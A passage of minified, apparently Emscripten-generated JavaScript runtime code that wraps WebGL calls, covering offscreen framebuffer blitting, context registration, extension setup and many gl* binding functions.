firefoxVersion=firefoxMatch[1];context.defaultFboForbidBlitFramebuffer=firefoxVersion<67}}context.defaultColorTarget=gl.createTexture(),context.defaultDepthTarget=gl.createRenderbuffer(),GL.resizeOffscreenFramebuffer(context),gl.bindTexture(3553,context.defaultColorTarget),gl.texParameteri(3553,10241,9728),gl.texParameteri(3553,10240,9728),gl.texParameteri(3553,10242,33071),gl.texParameteri(3553,10243,33071),gl.texImage2D(3553,0,6408,gl.canvas.width,gl.canvas.height,0,6408,5121,null),gl.framebufferTexture2D(36160,36064,3553,context.defaultColorTarget,0),gl.bindTexture(3553,null);gl.createRenderbuffer();gl.bindRenderbuffer(36161,context.defaultDepthTarget),gl.renderbufferStorage(36161,33189,gl.canvas.width,gl.canvas.height),gl.framebufferRenderbuffer(36160,36096,36161,context.defaultDepthTarget),gl.bindRenderbuffer(36161,null);var vb=gl.createBuffer();gl.bindBuffer(34962,vb),gl.bufferData(34962,new Float32Array([-1,-1,-1,1,1,-1,1,1]),35044),gl.bindBuffer(34962,null),context.blitVB=vb;var vs=gl.createShader(35633);gl.shaderSource(vs,"attribute vec2 pos;varying lowp vec2 tex;void main() { tex = pos * 0.5 + vec2(0.5,0.5); gl_Position = vec4(pos, 0.0, 1.0); }"),gl.compileShader(vs);var fs=gl.createShader(35632);gl.shaderSource(fs,"varying lowp vec2 tex;uniform sampler2D sampler;void main() { gl_FragColor = texture2D(sampler, tex); }"),gl.compileShader(fs);var blitProgram=gl.createProgram();gl.attachShader(blitProgram,vs),gl.attachShader(blitProgram,fs),gl.linkProgram(blitProgram),context.blitProgram=blitProgram,context.blitPosLoc=gl.getAttribLocation(blitProgram,"pos"),gl.useProgram(blitProgram),gl.uniform1i(gl.getUniformLocation(blitProgram,"sampler"),0),gl.useProgram(null),context.defaultVao=void 0,gl.createVertexArray&&(context.defaultVao=gl.createVertexArray(),gl.bindVertexArray(context.defaultVao),gl.enableVertexAttribArray(context.blitPosLoc),gl.bindVertexArray(null))},resizeOffscreenFramebuffer:function(context){var gl=context.GLctx;if(context.defaultColorTarget){var prevTextureBinding=gl.getParameter(32873);gl.bindTexture(3553,context.defaultColorTarget),gl.texImage2D(3553,0,6408,gl.drawingBufferWidth,gl.drawingBufferHeight,0,6408,5121,null),gl.bindTexture(3553,prevTextureBinding)}if(context.defaultDepthTarget){var prevRenderBufferBinding=gl.getParameter(36007);gl.bindRenderbuffer(36161,context.defaultDepthTarget),gl.renderbufferStorage(36161,33189,gl.drawingBufferWidth,gl.drawingBufferHeight),gl.bindRenderbuffer(36161,prevRenderBufferBinding)}},blitOffscreenFramebuffer:function(context){var gl=context.GLctx,prevScissorTest=gl.getParameter(3089);prevScissorTest&&gl.disable(3089);var prevFbo=gl.getParameter(36006);if(gl.blitFramebuffer&&!context.defaultFboForbidBlitFramebuffer)gl.bindFramebuffer(36008,context.defaultFbo),gl.bindFramebuffer(36009,null),gl.blitFramebuffer(0,0,gl.canvas.width,gl.canvas.height,0,0,gl.canvas.width,gl.canvas.height,16384,9728);else{gl.bindFramebuffer(36160,null);var prevProgram=gl.getParameter(35725);gl.useProgram(context.blitProgram);var prevVB=gl.getParameter(34964);gl.bindBuffer(34962,context.blitVB);var prevActiveTexture=gl.getParameter(34016);gl.activeTexture(33984);var prevTextureBinding=gl.getParameter(32873);gl.bindTexture(3553,context.defaultColorTarget);var prevBlend=gl.getParameter(3042);prevBlend&&gl.disable(3042);var prevCullFace=gl.getParameter(2884);prevCullFace&&gl.disable(2884);var prevDepthTest=gl.getParameter(2929);prevDepthTest&&gl.disable(2929);var prevStencilTest=gl.getParameter(2960);function draw(){gl.vertexAttribPointer(context.blitPosLoc,2,5126,!1,0,0),gl.drawArrays(5,0,4)}if(prevStencilTest&&gl.disable(2960),context.defaultVao){var prevVAO=gl.getParameter(34229);gl.bindVertexArray(context.defaultVao),draw(),gl.bindVertexArray(prevVAO)}else{for(var prevVertexAttribPointer={buffer:gl.getVertexAttrib(context.blitPosLoc,34975),size:gl.getVertexAttrib(context.blitPosLoc,34339),stride:gl.getVertexAttrib(context.blitPosLoc,34340),type:gl.getVertexAttrib(context.blitPosLoc,34341),normalized:gl.getVertexAttrib(context.blitPosLoc,34922),pointer:gl.getVertexAttribOffset(context.blitPosLoc,34373)},maxVertexAttribs=gl.getParameter(34921),prevVertexAttribEnables=[],i=0;i<maxVertexAttribs;++i){var prevEnabled=gl.getVertexAttrib(i,34338),wantEnabled=i==context.blitPosLoc;prevEnabled&&!wantEnabled&&gl.disableVertexAttribArray(i),!prevEnabled&&wantEnabled&&gl.enableVertexAttribArray(i),prevVertexAttribEnables[i]=prevEnabled}draw();for(i=0;i<maxVertexAttribs;++i){prevEnabled=prevVertexAttribEnables[i];var nowEnabled=i==context.blitPosLoc;prevEnabled&&!nowEnabled&&gl.enableVertexAttribArray(i),!prevEnabled&&nowEnabled&&gl.disableVertexAttribArray(i)}gl.bindBuffer(34962,prevVertexAttribPointer.buffer),gl.vertexAttribPointer(context.blitPosLoc,prevVertexAttribPointer.size,prevVertexAttribPointer.type,prevVertexAttribPointer.normalized,prevVertexAttribPointer.stride,prevVertexAttribPointer.offset)}prevStencilTest&&gl.enable(2960),prevDepthTest&&gl.enable(2929),prevCullFace&&gl.enable(2884),prevBlend&&gl.enable(3042),gl.bindTexture(3553,prevTextureBinding),gl.activeTexture(prevActiveTexture),gl.bindBuffer(34962,prevVB),gl.useProgram(prevProgram)}gl.bindFramebuffer(36160,prevFbo),prevScissorTest&&gl.enable(3089)},registerContext:function(ctx,webGLContextAttributes){var handle=_malloc(8);GROWABLE_HEAP_I32()[handle+4>>2]=_pthread_self();var context={handle:handle,attributes:webGLContextAttributes,version:webGLContextAttributes.majorVersion,GLctx:ctx};return ctx.canvas&&(ctx.canvas.GLctxObject=context),GL.contexts[handle]=context,(void 0===webGLContextAttributes.enableExtensionsByDefault||webGLContextAttributes.enableExtensionsByDefault)&&GL.initExtensions(context),webGLContextAttributes.renderViaOffscreenBackBuffer&&GL.createOffscreenFramebuffer(context),handle},makeContextCurrent:function(contextHandle){return GL.currentContext=GL.contexts[contextHandle],Module.ctx=GLctx=GL.currentContext&&GL.currentContext.GLctx,!(contextHandle&&!GLctx)},getContext:function(contextHandle){return GL.contexts[contextHandle]},deleteContext:function(contextHandle){GL.currentContext===GL.contexts[contextHandle]&&(GL.currentContext=null),"object"==typeof JSEvents&&JSEvents.removeAllHandlersOnTarget(GL.contexts[contextHandle].GLctx.canvas),GL.contexts[contextHandle]&&GL.contexts[contextHandle].GLctx.canvas&&(GL.contexts[contextHandle].GLctx.canvas.GLctxObject=void 0),_free(GL.contexts[contextHandle].handle),GL.contexts[contextHandle]=null},initExtensions:function(context){if(context||(context=GL.currentContext),!context.initExtensionsDone){context.initExtensionsDone=!0;var GLctx=context.GLctx;__webgl_enable_ANGLE_instanced_arrays(GLctx),__webgl_enable_OES_vertex_array_object(GLctx),__webgl_enable_WEBGL_draw_buffers(GLctx),__webgl_enable_WEBGL_draw_instanced_base_vertex_base_instance(GLctx),__webgl_enable_WEBGL_multi_draw_instanced_base_vertex_base_instance(GLctx),context.version>=2&&(GLctx.disjointTimerQueryExt=GLctx.getExtension("EXT_disjoint_timer_query_webgl2")),(context.version<2||!GLctx.disjointTimerQueryExt)&&(GLctx.disjointTimerQueryExt=GLctx.getExtension("EXT_disjoint_timer_query")),__webgl_enable_WEBGL_multi_draw(GLctx),(GLctx.getSupportedExtensions()||[]).forEach((function(ext){ext.includes("lose_context")||ext.includes("debug")||GLctx.getExtension(ext)}))}}};function _emscripten_glActiveTexture(x0){GLctx.activeTexture(x0)}function _emscripten_glAttachShader(program,shader){GLctx.attachShader(GL.programs[program],GL.shaders[shader])}function _emscripten_glBeginTransformFeedback(x0){GLctx.beginTransformFeedback(x0)}function _emscripten_glBindBuffer(target,buffer){35051==target?GLctx.currentPixelPackBufferBinding=buffer:35052==target&&(GLctx.currentPixelUnpackBufferBinding=buffer),GLctx.bindBuffer(target,GL.buffers[buffer])}function _emscripten_glBindBufferBase(target,index,buffer){GLctx.bindBufferBase(target,index,GL.buffers[buffer])}function _emscripten_glBindBufferRange(target,index,buffer,offset,ptrsize){GLctx.bindBufferRange(target,index,GL.buffers[buffer],offset,ptrsize)}function _emscripten_glBindFramebuffer(target,framebuffer){GLctx.bindFramebuffer(target,framebuffer?GL.framebuffers[framebuffer]:GL.currentContext.defaultFbo)}function _emscripten_glBindRenderbuffer(target,renderbuffer){GLctx.bindRenderbuffer(target,GL.renderbuffers[renderbuffer])}function _emscripten_glBindTexture(target,texture){GLctx.bindTexture(target,GL.textures[texture])}function _emscripten_glBindVertexArray(vao){GLctx.bindVertexArray(GL.vaos[vao])}function _emscripten_glBlendColor(x0,x1,x2,x3){GLctx.blendColor(x0,x1,x2,x3)}function _emscripten_glBlendEquation(x0){GLctx.blendEquation(x0)}function _emscripten_glBlendFunc(x0,x1){GLctx.blendFunc(x0,x1)}function _emscripten_glBlendFuncSeparate(x0,x1,x2,x3){GLctx.blendFuncSeparate(x0,x1,x2,x3)}function _emscripten_glBlitFramebuffer(x0,x1,x2,x3,x4,x5,x6,x7,x8,x9){GLctx.blitFramebuffer(x0,x1,x2,x3,x4,x5,x6,x7,x8,x9)}function _emscripten_glBufferData(target,size,data,usage){GL.currentContext.version>=2?data&&size?GLctx.bufferData(target,GROWABLE_HEAP_U8(),usage,data,size):GLctx.bufferData(target,size,usage):GLctx.bufferData(target,data?GROWABLE_HEAP_U8().subarray(data,data+size):size,usage)}function _emscripten_glBufferSubData(target,offset,size,data){GL.currentContext.version>=2?size&&GLctx.bufferSubData(target,offset,GROWABLE_HEAP_U8(),data,size):GLctx.bufferSubData(target,offset,GROWABLE_HEAP_U8().subarray(data,data+size))}function _emscripten_glCheckFramebufferStatus(x0){return GLctx.checkFramebufferStatus(x0)}function _emscripten_glClear(x0){GLctx.clear(x0)}function _emscripten_glClearBufferfv(buffer,drawbuffer,value){GLctx.clearBufferfv(buffer,drawbuffer,GROWABLE_HEAP_F32(),value>>2)}function _emscripten_glClearColor(x0,x1,x2,x3){GLctx.clearColor(x0,x1,x2,x3)}function _emscripten_glClearDepthf(x0){GLctx.clearDepth(x0)}function _emscripten_glColorMask(red,green,blue,alpha){GLctx.colorMask(!!red,!!green,!!blue,!!alpha)}function _emscripten_glCompileShader(shader){GLctx.compileShader(GL.shaders[shader])}function _emscripten_glCompressedTexImage2D(target,level,internalFormat,width,height,border,imageSize,data){GL.currentContext.version>=2?GLctx.currentPixelUnpackBufferBinding||!imageSize?GLctx.compressedTexImage2D(target,level,internalFormat,width,height,border,imageSize,data):GLctx.compressedTexImage2D(target,level,internalFormat,width,height,border,GROWABLE_HEAP_U8(),data,imageSize):GLctx.compressedTexImage2D(target,level,internalFormat,width,height,border,data?GROWABLE_HEAP_U8().subarray(data,data+imageSize):null)}function _emscripten_glCopyBufferSubData(x0,x1,x2,x3,x4){GLctx.copyBufferSubData(x0,x1,x2,x3,x4)}function _emscripten_glCreateProgram(){var id=GL.getNewId(GL.programs),program=GLctx.createProgram();return program.name=id,program.maxUniformLength=program.maxAttributeLength=program.maxUniformBlockNameLength=0,program.uniformIdCounter=1,GL.programs[id]=program,id}function _emscripten_glCreateShader(shaderType){var id=GL.getNewId(GL.shaders);return GL.shaders[id]=GLctx.createShader(shaderType),id}function _emscripten_glCullFace(x0){GLctx.cullFace(x0)}function _emscripten_glDeleteBuffers(n,buffers){for(var i=0;i<n;i++){var id=GROWABLE_HEAP_I32()[buffers+4*i>>2],buffer=GL.buffers[id];buffer&&(GLctx.deleteBuffer(buffer),buffer.name=0,GL.buffers[id]=null,id==GLctx.currentPixelPackBufferBinding&&(GLctx.currentPixelPackBufferBinding=0),id==GLctx.currentPixelUnpackBufferBinding&&(GLctx.currentPixelUnpackBufferBinding=0))}}function _emscripten_glDeleteFramebuffers(n,framebuffers){for(var i=0;i<n;++i){var id=GROWABLE_HEAP_I32()[framebuffers+4*i>>2],framebuffer=GL.framebuffers[id];framebuffer&&(GLctx.deleteFramebuffer(framebuffer),framebuffer.name=0,GL.framebuffers[id]=null)}}function _emscripten_glDeleteProgram(id){if(id){var program=GL.programs[id];program?(GLctx.deleteProgram(program),program.name=0,GL.programs[id]=null):GL.recordError(1281)}}function _emscripten_glDeleteQueries(n,ids){for(var i=0;i<n;i++){var id=GROWABLE_HEAP_I32()[ids+4*i>>2],query=GL.queries[id];query&&(GLctx.deleteQuery(query),GL.queries[id]=null)}}function _emscripten_glDeleteRenderbuffers(n,renderbuffers){for(var i=0;i<n;i++){var id=GROWABLE_HEAP_I32()[renderbuffers+4*i>>2],renderbuffer=GL.renderbuffers[id];renderbuffer&&(GLctx.deleteRenderbuffer(renderbuffer),renderbuffer.name=0,GL.renderbuffers[id]=null)}}function _emscripten_glDeleteShader(id){if(id){var shader=GL.shaders[id];shader?(GLctx.deleteShader(shader),GL.shaders[id]=null):GL.recordError(1281)}}function _emscripten_glDeleteSync(id){if(id){var sync=GL.syncs[id];sync?(GLctx.deleteSync(sync),sync.name=0,GL.syncs[id]=null):GL.recordError(1281)}}function _emscripten_glDeleteTextures(n,textures){for(var i=0;i<n;i++){var id=GROWABLE_HEAP_I32()[textures+4*i>>2],texture=GL.textures[id];texture&&(GLctx.deleteTexture(texture),texture.name=0,GL.textures[id]=null)}}function _emscripten_glDeleteVertexArrays(n,vaos){for(var i=0;i<n;i++){var id=GROWABLE_HEAP_I32()[vaos+4*i>>2];GLctx.deleteVertexArray(GL.vaos[id]),GL.vaos[id]=null}}function _emscripten_glDepthFunc(x0){GLctx.depthFunc(x0)}function _emscripten_glDepthMask(flag){GLctx.depthMask(!!flag)}function _emscripten_glDisable(x0){GLctx.disable(x0)}function _emscripten_glDisableVertexAttribArray(index){GLctx.disableVertexAttribArray(index)}function _emscripten_glDrawArrays(mode,first,count){GLctx.drawArrays(mode,first,count)}function _emscripten_glDrawArraysInstanced(mode,first,count,primcount){GLctx.drawArraysInstanced(mode,first,count,primcount)}function _emscripten_glDrawElements(mode,count,type,indices){GLctx.drawElements(mode,count,type,indices)}function _emscripten_glDrawElementsInstanced(mode,count,type,indices,primcount){GLctx.drawElementsInstanced(mode,count,type,indices,primcount)}function _emscripten_glEnable(x0){GLctx.enable(x0)}function _emscripten_glEnableVertexAttribArray(index){GLctx.enableVertexAttribArray(index)}function _emscripten_glEndTransformFeedback(){GLctx.endTransformFeedback()}function _emscripten_glFenceSync(condition,flags){var sync=GLctx.fenceSync(condition,flags);if(sync){var id=GL.getNewId(GL.syncs);return sync.name=id,GL.syncs[id]=sync,id}return 0}function _emscripten_glFinish(){GLctx.finish()}function _emscripten_glFramebufferRenderbuffer(target,attachment,renderbuffertarget,renderbuffer){GLctx.framebufferRenderbuffer(target,attachment,renderbuffertarget,GL.renderbuffers[renderbuffer])}function _emscripten_glFramebufferTexture2D(target,attachment,textarget,texture,level){GLctx.framebufferTexture2D(target,attachment,textarget,GL.textures[texture],level)}function _emscripten_glFramebufferTextureLayer(target,attachment,texture,level,layer){GLctx.framebufferTextureLayer(target,attachment,GL.textures[texture],level,layer)}function _emscripten_glFrontFace(x0){GLctx.frontFace(x0)}function __glGenObject(n,buffers,createFunction,objectTable){for(var i=0;i<n;i++){var buffer=GLctx[createFunction](),id=buffer&&GL.getNewId(objectTable);buffer?(buffer.name=id,objectTable[id]=buffer):GL.recordError(1282),GROWABLE_HEAP_I32()[buffers+4*i>>2]=id}}function _emscripten_glGenBuffers(n,buffers){__glGenObject(n,buffers,"createBuffer",GL.buffers)}function _emscripten_glGenFramebuffers(n,ids){__glGenObject(n,ids,"createFramebuffer",GL.framebuffers)}function _emscripten_glGenQueries(n,ids){__glGenObject(n,ids,"createQuery",GL.queries)}function _emscripten_glGenRenderbuffers(n,renderbuffers){__glGenObject(n,renderbuffers,"createRenderbuffer",GL.renderbuffers)}function _emscripten_glGenTextures(n,textures){__glGenObject(n,textures,"createTexture",GL.textures)}function _emscripten_glGenVertexArrays(n,arrays){__glGenObject(n,arrays,"createVertexArray",GL.vaos)}function _emscripten_glGenerateMipmap(x0){GLctx.generateMipmap(x0)}function readI53FromU64(ptr){return GROWABLE_HEAP_U32()[ptr>>2]+4294967296*GROWABLE_HEAP_U32()[ptr+4>>2]}function writeI53ToI64(ptr,num){GROWABLE_HEAP_U32()[ptr>>2]=num,GROWABLE_HEAP_U32()[ptr+4>>2]=(num-GROWABLE_HEAP_U32()[ptr>>2])/4294967296;var deserialized=num>=0?readI53FromU64(ptr):readI53FromI64(ptr);deserialized!=num&&warnOnce("writeI53ToI64() out of range: serialized JS Number "+num+" to Wasm heap as bytes lo=0x"+GROWABLE_HEAP_U32()[ptr>>2].toString(16)+", hi=0x"+GROWABLE_HEAP_U32()[ptr+4>>2].toString(16)+", which deserializes back to "+deserialized+" instead!")}function emscriptenWebGLGet(name_,p,type){if(p){var ret=void 0;switch(name_){case 36346:ret=1;break;case 36344:return void(0!=type&&1!=type&&GL.recordError(1280));case 34814:case 36345:ret=0;break;case 34466:var formats=GLctx.getParameter(34467);ret=formats?formats.length:0;break;case 33309:if(GL.currentContext.version<2)return void GL.recordError(1282);ret=2*(GLctx.getSupportedExtensions()||[]).length;break;case 33307:case 33308:if(GL.currentContext.version<2)return void GL.recordError(1280);ret=33307==name_?3:0}if(void 0===ret){var result=GLctx.getParameter(name_);switch(typeof result){case"number":ret=result;break;case"boolean":ret=result?1:0;break;case"string":return void GL.recordError(1280);case"object":if(null===result)switch(name_){case 34964:case 35725:case 34965:case 36006:case 36007:case 32873:case 34229:case 36662:case 36663:case 35053:case 35055:case 36010:case 35097:case 35869:case 32874:case 36389:case 35983:case 35368:case 34068:ret=0;break;default:return void GL.recordError(1280)}else{if(result instanceof Float32Array||result instanceof Uint32Array||result instanceof Int32Array||result instanceof Array){for(var i=0;i<result.length;++i)switch(type){case 0:GROWABLE_HEAP_I32()[p+4*i>>2]=result[i];break;case 2:GROWABLE_HEAP_F32()[p+4*i>>2]=result[i];break;case 4:GROWABLE_HEAP_I8()[p+i>>0]=result[i]?1:0}return}try{ret=0|result.name}catch(e){return GL.recordError(1280),void err("GL_INVALID_ENUM in glGet"+type+"v: Unknown object returned from WebGL getParameter("+name_+")! (error: "+e+")")}}break;default:return GL.recordError(1280),void err("GL_INVALID_ENUM in glGet"+type+"v: Native code calling glGet"+type+"v("+name_+") and it returns "+result+" of type "+typeof result+"!")}}switch(type){case 1:writeI53ToI64(p,ret);break;case 0:GROWABLE_HEAP_I32()[p>>2]=ret;break;case 2:GROWABLE_HEAP_F32()[p>>2]=ret;break;case 4:GROWABLE_HEAP_I8()[p>>0]=ret?1:0}}else GL.recordError(1281)}function _emscripten_glGetFloatv(name_,p){emscriptenWebGLGet(name_,p,2)}function _emscripten_glGetIntegerv(name_,p){emscriptenWebGLGet(name_,p,0)}function _emscripten_glGetProgramInfoLog(program,maxLength,length,infoLog){var log=GLctx.getProgramInfoLog(GL.programs[program]);null===log&&(log="(unknown error)");var numBytesWrittenExclNull=maxLength>0&&infoLog?stringToUTF8(log,infoLog,maxLength):0;length&&(GROWABLE_HEAP_I32()[length>>2]=numBytesWrittenExclNull)}function _emscripten_glGetProgramiv(program,pname,p){if(p)if(program>=GL.counter)GL.recordError(1281);else if(program=GL.programs[program],35716==pname){var log=GLctx.getProgramInfoLog(program);null===log&&(log="(unknown error)"),GROWABLE_HEAP_I32()[p>>2]=log.length+1}else if(35719==pname){if(!program.maxUniformLength)for(var i=0;i<GLctx.getProgramParameter(program,35718);++i)program.maxUniformLength=Math.max(program.maxUniformLength,GLctx.getActiveUniform(program,i).name.length+1);GROWABLE_HEAP_I32()[p>>2]=program.maxUniformLength}else if(35722==pname){if(!program.maxAttributeLength)for(i=0;i<GLctx.getProgramParameter(program,35721);++i)program.maxAttributeLength=Math.max(program.maxAttributeLength,GLctx.getActiveAttrib(program,i).name.length+1);GROWABLE_HEAP_I32()[p>>2]=program.maxAttributeLength}else if(35381==pname){if(!program.maxUniformBlockNameLength)for(i=0;i<GLctx.getProgramParameter(program,35382);++i)program.maxUniformBlockNameLength=Math.max(program.maxUniformBlockNameLength,GLctx.getActiveUniformBlockName(program,i).length+1);GROWABLE_HEAP_I32()[p>>2]=program.maxUniformBlockNameLength}else GROWABLE_HEAP_I32()[p>>2]=GLctx.getProgramParameter(program,pname);else GL.recordError(1281)}function _emscripten_glGetShaderInfoLog(shader,maxLength,length,infoLog){var log=GLctx.getShaderInfoLog(GL.shaders[shader]);null===log&&(log="(unknown error)");var numBytesWrittenExclNull=maxLength>0&&infoLog?stringToUTF8(log,infoLog,maxLength):0;length&&(GROWABLE_HEAP_I32()[length>>2]=numBytesWrittenExclNull)}function _emscripten_glGetShaderiv(shader,pname,p){if(p)if(35716==pname){var log=GLctx.getShaderInfoLog(GL.shaders[shader]);null===log&&(log="(unknown error)");var logLength=log?log.length+1:0;GROWABLE_HEAP_I32()[p>>2]=logLength}else if(35720==pname){var source=GLctx.getShaderSource(GL.shaders[shader]),sourceLength=source?source.length+1:0;GROWABLE_HEAP_I32()[p>>2]=sourceLength}else GROWABLE_HEAP_I32()[p>>2]=GLctx.getShaderParameter(GL.shaders[shader],pname);else GL.recordError(1281)}function stringToNewUTF8(jsString){var length=lengthBytesUTF8(jsString)+1,cString=_malloc(length);return stringToUTF8(jsString,cString,length),cString}function _emscripten_glGetString(name_){var ret=GL.stringCache[name_];if(!ret){switch(name_){case 7939:var exts=GLctx.getSupportedExtensions()||[];ret=stringToNewUTF8((exts=exts.concat(exts.map((function(e){return"GL_"+e})))).join(" "));break;case 7936:case 7937:case 37445:case 37446:var s=GLctx.getParameter(name_);s||GL.recordError(1280),ret=s&&stringToNewUTF8(s);break;case 7938:var glVersion=GLctx.getParameter(7938);ret=stringToNewUTF8(glVersion=GL.currentContext.version>=2?"OpenGL ES 3.0 ("+glVersion+")":"OpenGL ES 2.0 ("+glVersion+")");break;case 35724:var glslVersion=GLctx.getParameter(35724),ver_num=glslVersion.match(/^WebGL GLSL ES ([0-9]\.[0-9][0-9]?)(?:$| .*)/);null!==ver_num&&(3==ver_num[1].length&&(ver_num[1]=ver_num[1]+"0"),glslVersion="OpenGL ES GLSL ES "+ver_num[1]+" ("+glslVersion+")"),ret=stringToNewUTF8(glslVersion);break;default:GL.recordError(1280)}GL.stringCache[name_]=ret}return ret}function _emscripten_glGetStringi(name,index){if(GL.currentContext.version<2)return GL.recordError(1282),0;var stringiCache=GL.stringiCache[name];if(stringiCache)return index<0||index>=stringiCache.length?(GL.recordError(1281),0):stringiCache[index];if(7939===name){var exts=GLctx.getSupportedExtensions()||[];return exts=(exts=exts.concat(exts.map((function(e){return"GL_"+e})))).map((function(e){return stringToNewUTF8(e)})),stringiCache=GL.stringiCache[name]=exts,index<0||index>=stringiCache.length?(GL.recordError(1281),0):stringiCache[index]}return GL.recordError(1280),0}function _emscripten_glGetSynciv(sync,pname,bufSize,length,values){if(bufSize<0)GL.recordError(1281);else if(values){var ret=GLctx.getSyncParameter(GL.syncs[sync],pname);null!==ret&&(GROWABLE_HEAP_I32()[values>>2]=ret,length&&(GROWABLE_HEAP_I32()[length>>2]=1))}else GL.recordError(1281)}function _emscripten_glGetUniformBlockIndex(program,uniformBlockName){return GLctx.getUniformBlockIndex(GL.programs[program],UTF8ToString(uniformBlockName))}function webglGetLeftBracePos(name){return"]"==name.slice(-1)&&name.lastIndexOf("[")}function webglPrepareUniformLocationsBeforeFirstUse(program){var i,j,uniformLocsById=program.uniformLocsById,uniformSizeAndIdsByName=program.uniformSizeAndIdsByName;if(!uniformLocsById)for(program.uniformLocsById=uniformLocsById={},program.uniformArrayNamesById={},i=0;i<GLctx.getProgramParameter(program,35718);++i){var u=GLctx.getActiveUniform(program,i),nm=u.name,sz=u.size,lb=webglGetLeftBracePos(nm),arrayName=lb>0?nm.slice(0,lb):nm,id=program.uniformIdCounter;for(program.uniformIdCounter+=sz,uniformSizeAndIdsByName[arrayName]=[sz,id],j=0;j<sz;++j)uniformLocsById[id]=j,program.uniformArrayNamesById[id++]=arrayName}}function _emscripten_glGetUniformLocation(program,name){if(name=UTF8ToString(name),program=GL.programs[program]){webglPrepareUniformLocationsBeforeFirstUse(program);var uniformLocsById=program.uniformLocsById,arrayIndex=0,uniformBaseName=name,leftBrace=webglGetLeftBracePos(name);leftBrace>0&&(arrayIndex=jstoi_q(name.slice(leftBrace+1))>>>0,uniformBaseName=name.slice(0,leftBrace));var sizeAndId=program.uniformSizeAndIdsByName[uniformBaseName];if(sizeAndId&&arrayIndex<sizeAndId[0]&&(uniformLocsById[arrayIndex+=sizeAndId[1]]=uniformLocsById[arrayIndex]||GLctx.getUniformLocation(program,name)))return arrayIndex}else GL.recordError(1281);return-1}function _emscripten_glLinkProgram(program){program=GL.programs[program],GLctx.linkProgram(program),program.uniformLocsById=0,program.uniformSizeAndIdsByName={}}function _emscripten_glPixelStorei(pname,param){3317==pname&&(GL.unpackAlignment=param),GLctx.pixelStorei(pname,param)}function _emscripten_glReadBuffer(x0){GLctx.readBuffer(x0)}function computeUnpackAlignedImageSize(width,height,sizePerPixel,alignment){return height*function roundedToNextMultipleOf(x,y){return x+y-1&-y}(width*sizePerPixel,alignment)}function __colorChannelsInGlTextureFormat(format){return{5:3,6:4,8:2,29502:3,29504:4,26917:2,26918:2,29846:3,29847:4}[format-6402]||1}function heapObjectForWebGLType(type){return 0==(type-=5120)?GROWABLE_HEAP_I8():1==type?GROWABLE_HEAP_U8():2==type?GROWABLE_HEAP_I16():4==type?GROWABLE_HEAP_I32():6==type?GROWABLE_HEAP_F32():5==type||28922==type||28520==type||30779==type||30782==type?GROWABLE_HEAP_U32():GROWABLE_HEAP_U16()}function heapAccessShiftForWebGLHeap(heap){return 31-Math.clz32(heap.BYTES_PER_ELEMENT)}function emscriptenWebGLGetTexPixelData(type,format,width,height,pixels,internalFormat){var heap=heapObjectForWebGLType(type),shift=heapAccessShiftForWebGLHeap(heap),byteSize=1<<shift,bytes=computeUnpackAlignedImageSize(width,height,__colorChannelsInGlTextureFormat(format)*byteSize,GL.unpackAlignment);return heap.subarray(pixels>>shift,pixels+bytes>>shift)}function _emscripten_glReadPixels(x,y,width,height,format,type,pixels){if(GL.currentContext.version>=2)if(GLctx.currentPixelPackBufferBinding)GLctx.readPixels(x,y,width,height,format,type,pixels);else{var heap=heapObjectForWebGLType(type);GLctx.readPixels(x,y,width,height,format,type,heap,pixels>>heapAccessShiftForWebGLHeap(heap))}else{var pixelData=emscriptenWebGLGetTexPixelData(type,format,width,height,pixels,format);pixelData?GLctx.readPixels(x,y,width,height,format,type,pixelData):GL.recordError(1280)}}function _emscripten_glRenderbufferStorage(x0,x1,x2,x3){GLctx.renderbufferStorage(x0,x1,x2,x3)}function _emscripten_glScissor(x0,x1,x2,x3){GLctx.scissor(x0,x1,x2,x3)}function _emscripten_glShaderSource(shader,count,string,length){var source=GL.getSource(shader,count,string,length);GLctx.shaderSource(GL.shaders[shader],source)}function _emscripten_glTexImage2D(target,level,internalFormat,width,height,border,format,type,pixels){if(GL.currentContext.version>=2)if(GLctx.currentPixelUnpackBufferBinding)GLctx.texImage2D(target,level,internalFormat,width,height,border,format,type,pixels);else if(pixels){var heap=heapObjectForWebGLType(type);GLctx.texImage2D(target,level,internalFormat,width,height,border,format,type,heap,pixels>>heapAccessShiftForWebGLHeap(heap))}else GLctx.texImage2D(target,level,internalFormat,width,height,border,format,type,null);else GLctx.texImage2D(target,level,internalFormat,width,height,border,format,type,pixels?emscriptenWebGLGetTexPixelData(type,format,width,height,pixels,internalFormat):null)}function _emscripten_glTexImage3D(target,level,internalFormat,width,height,depth,border,format,type,pixels){if(GLctx.currentPixelUnpackBufferBinding)GLctx.texImage3D(target,level,internalFormat,width,height,depth,border,format,type,pixels);else if(pixels){var heap=heapObjectForWebGLType(type);GLctx.texImage3D(target,level,internalFormat,width,height,depth,border,format,type,heap,pixels>>heapAccessShiftForWebGLHeap(heap))}else GLctx.texImage3D(target,level,internalFormat,width,height,depth,border,format,type,null)}function _emscripten_glTexParameterf(x0,x1,x2){GLctx.texParameterf(x0,x1,x2)}function _emscripten_glTexParameteri(x0,x1,x2){GLctx.texParameteri(x0,x1,x2)}function _emscripten_glTexStorage2D(x0,x1,x2,x3,x4){GLctx.texStorage2D(x0,x1,x2,x3,x4)}function _emscripten_glTexSubImage3D(target,level,xoffset,yoffset,zoffset,width,height,depth,format,type,pixels){if(GLctx.currentPixelUnpackBufferBinding)GLctx.texSubImage3D(target,level,xoffset,yoffset,zoffset,width,height,depth,format,type,pixels);else if(pixels){var heap=heapObjectForWebGLType(type);GLctx.texSubImage3D(target,level,xoffset,yoffset,zoffset,width,height,depth,format,type,heap,pixels>>heapAccessShiftForWebGLHeap(heap))}else GLctx.texSubImage3D(target,level,xoffset,yoffset,zoffset,width,height,depth,format,type,null)}function _emscripten_glTransformFeedbackVaryings(program,count,varyings,bufferMode){program=GL.programs[program];for(var vars=[],i=0;i<count;i++)vars.push(UTF8ToString(GROWABLE_HEAP_I32()[varyings+4*i>>2]));GLctx.transformFeedbackVaryings(program,vars,bufferMode)}function webglGetUniformLocation(location){var p=GLctx.currentProgram;if(p){var webglLoc=p.uniformLocsById[location];return"number"==typeof webglLoc&&(p.uniformLocsById[location]=webglLoc=GLctx.getUniformLocation(p,p.uniformArrayNamesById[location]+(webglLoc>0?"["+webglLoc+"]":""))),webglLoc}GL.recordError(1282)}function _emscripten_glUniform1f(location,v0){GLctx.uniform1f(webglGetUniformLocation(location),v0)}function _emscripten_glUniform1i(location,v0){GLctx.uniform1i(webglGetUniformLocation(location),v0)}var __miniTempWebGLIntBuffers=[];function 